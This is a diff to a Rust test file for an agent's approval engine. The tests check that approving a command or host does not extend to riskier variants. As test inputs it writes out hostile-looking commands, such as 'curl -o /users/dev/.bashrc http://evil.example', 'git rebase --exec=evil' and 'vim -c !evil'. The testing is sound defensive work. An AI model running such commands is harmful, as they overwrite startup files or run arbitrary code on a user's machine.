@@ -221,14 +221,138 @@ fn approvals_are_listed_and_taken_back_by_id() {
 }
 
 #[test]
-fn without_a_store_always_allow_allows_this_call_only() {
+fn without_a_store_always_allow_is_not_offered_and_allows_this_call_only() {
     let engine = engine();
     let asked = question(shell(&engine, "make"));
+    // Not on offer: the person would believe it saved (found by the review
+    // of step 12).
+    assert!(!asked.storable);
+    assert_eq!(
+        asked.choices(),
+        [
+            ApprovalChoice::AllowOnce,
+            ApprovalChoice::AllowSession,
+            ApprovalChoice::Deny
+        ]
+    );
+    // Given anyway, it allows this call and saves nothing.
     let recorded = engine
         .record(&asked, &ApprovalChoice::AllowProject)
         .unwrap();
     assert!(recorded.allowed && recorded.added.is_empty());
     assert_eq!(said(&shell(&engine, "make")), Ask);
+
+    // With a store it is on offer.
+    let scratch = cortex_testkit::scratch!("approvals_offered");
+    let stored = with_store(&scratch);
+    let asked = question(shell(&stored, "make"));
+    assert!(asked.storable);
+    assert!(asked.choices().contains(&ApprovalChoice::AllowProject));
+}
+
+/// An approval of one call adds `program subcommand *` only where the
+/// subcommand's further words cannot run a program, fetch one, or reach
+/// the network with one; elsewhere it adds the exact line. After each
+/// approval below the second line, which the approval must not cover, is
+/// still asked about (found by the review of step 12).
+#[test]
+fn an_approval_reaches_no_further_than_the_line_it_was_given_for() {
+    for (first, then) in [
+        ("npm exec cowsay", "npm exec evilpkg --yes"),
+        ("pnpm dlx cowsay", "pnpm dlx evilpkg"),
+        ("yarn dlx cowsay", "yarn dlx evilpkg"),
+        ("git rebase main", "git rebase --exec=evil main"),
+        ("git bisect start", "git bisect run evil"),
+        ("git submodule update", "git submodule foreach evil"),
+        ("git push origin", "git push --receive-pack=evil origin"),
+        ("git fetch origin", "git fetch --upload-pack=evil origin"),
+        ("git", "git push"),
+        ("rustup run nightly cargo", "rustup run nightly evil"),
+        ("cargo watch -x build", "cargo watch -x evil"),
+        (
+            "curl http://x.example",
+            "curl -o /users/dev/.bashrc http://evil.example",
+        ),
+        ("wget http://x.example", "wget -O x http://evil.example"),
+        ("vim file", "vim -c !evil"),
+        ("java Main", "java -jar evil.jar"),
+    ] {
+        let engine = engine();
+        let asked = question(shell(&engine, first));
+        engine
+            .record(&asked, &ApprovalChoice::AllowSession)
+            .unwrap();
+        let lifts: Vec<&str> = asked
+            .lifts
+            .iter()
+            .map(|rule| rule.pattern.as_str())
+            .collect();
+        assert_eq!(lifts, [first], "{first:?} is approved as that line");
+        assert_eq!(said(&shell(&engine, first)), Allow, "{first:?}");
+        assert_eq!(said(&shell(&engine, then)), Ask, "{first:?}, then {then:?}");
+    }
+    // What the doc shows, and a subcommand whose further words choose only
+    // what is built or shown: the subcommand, with any further words.
+    for (first, rule_given, then) in [
+        ("cargo build", "cargo build *", "cargo build --release"),
+        ("npm run build", "npm run *", "npm run test"),
+        ("git commit -m fix", "git commit *", "git commit --amend"),
+        ("make", "make *", "make -j8 all"),
+        ("rm src/main.rs", "rm *", "rm src/lib.rs"),
+    ] {
+        let engine = engine();
+        let asked = question(shell(&engine, first));
+        assert_eq!(asked.lifts[0].pattern, rule_given, "{first:?}");
+        engine
+            .record(&asked, &ApprovalChoice::AllowSession)
+            .unwrap();
+        assert_eq!(
+            said(&shell(&engine, then)),
+            Allow,
+            "{first:?}, then {then:?}"
+        );
+    }
+}
+
+/// A network approval allows that host and no other: a host is matched as
+/// a pattern, so the rule spells it as one (found by the review of step
+/// 12).
+#[test]
+fn approving_a_host_covers_that_host_and_no_other() {
+    let reach = |engine: &Engine, host: &str| {
+        engine.decide(&cortex_policy::Request {
+            tool: "fetch",
+            default: RuleAction::Allow,
+            accesses: &[cortex_policy::Access::Network {
+                host: Some(host.to_owned()),
+            }],
+        })
+    };
+    // A host that is a pattern's wildcard is that text, not every host.
+    let engine = engine();
+    let asked = question(reach(&engine, "*"));
+    assert_eq!(asked.lifts[0].pattern, "[*]");
+    engine
+        .record(&asked, &ApprovalChoice::AllowSession)
+        .unwrap();
+    assert_eq!(said(&reach(&engine, "evil.example")), Ask);
+    // An address in brackets matches itself.
+    let engine = self::engine();
+    let asked = question(reach(&engine, "[::1]"));
+    engine
+        .record(&asked, &ApprovalChoice::AllowSession)
+        .unwrap();
+    assert_eq!(said(&reach(&engine, "[::1]")), Allow);
+    assert_eq!(said(&reach(&engine, "::1")), Ask);
+    // A plain name, in any case, and with a final dot.
+    let engine = self::engine();
+    let asked = question(reach(&engine, "Docs.RS."));
+    assert_eq!(asked.lifts[0].pattern, "docs.rs");
+    engine
+        .record(&asked, &ApprovalChoice::AllowSession)
+        .unwrap();
+    assert_eq!(said(&reach(&engine, "docs.rs")), Allow);
+    assert_eq!(said(&reach(&engine, "evil.docs.rs")), Ask);
 }
 
 /// A stored file this build does not understand in full grants nothing,
